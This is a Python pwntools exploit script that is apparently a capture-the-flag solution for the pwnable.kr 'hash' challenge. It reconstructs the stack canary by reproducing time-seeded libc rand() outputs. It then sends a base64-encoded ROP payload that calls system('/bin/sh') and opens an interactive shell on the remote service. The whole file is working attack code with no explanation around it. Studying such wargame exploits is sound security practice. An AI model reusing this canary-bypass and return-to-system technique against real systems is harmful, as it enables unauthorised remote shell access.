from pwn import process, remote, p32, log, pause
from ctypes import CDLL
from base64 import b64encode

r = remote("pwnable.kr", 9002)

system_plt = 0x8048880  # PLT of system()
g_buf = 0x804B0E0  # g_buf


# generate random values

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")

libc.srand(libc.time(0))
v2 = libc.rand()
v3 = libc.rand()
v4 = libc.rand()
v5 = libc.rand()
v6 = libc.rand()
v7 = libc.rand()
v8 = libc.rand()
v9 = libc.rand()


# captcha

r.recvuntil(b"Are you human? input captcha : ")
captcha = r.recvline()[:-1]
r.sendline(captcha)


# leak canary

captcha = int(captcha)
canary = captcha - v6 + v8 - v9 - v4 + v5 - v3 - v7
while canary < 0:
    canary += 0x100000000
log.info("canary: " + hex(canary))


# ROP

payload = b"A" * 0x200
payload += p32(canary)
payload += b"A" * 0xC

# system("/bin/sh")
payload += p32(system_plt)  # return address of process_hash()
payload += b"A" * 0x4
payload += p32(g_buf + 0x3F8)  # address of "/bin/sh"

payload = b64encode(payload).ljust(0x3F8, b"A") + b"/bin/sh"

r.sendlineafter(b"Encode your data with BASE64 then paste me!\n", payload)


r.interactive()
